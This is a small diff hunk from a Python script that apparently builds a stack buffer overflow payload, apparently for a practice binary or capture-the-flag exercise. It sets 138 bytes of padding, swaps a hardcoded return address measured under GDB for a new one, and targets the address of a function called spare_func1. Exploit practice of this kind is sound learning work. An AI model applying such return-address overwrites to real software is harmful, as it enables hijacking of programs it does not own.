@@ -5,8 +5,9 @@ import sys
 
 oflow = b'A' * 138 #+ b'C' * 8 + b'D' * 8
 
-retaddr = 0x7fffffffe5f8 # GDB
+#retaddr = 0x7fffffffe5f8 # GDB
 #retaddr = 0x7fffffffde88 # no GDB
+retaddr = 0x7fffffffe698
 
 faddr = 0x4009ae # spare_func1
 
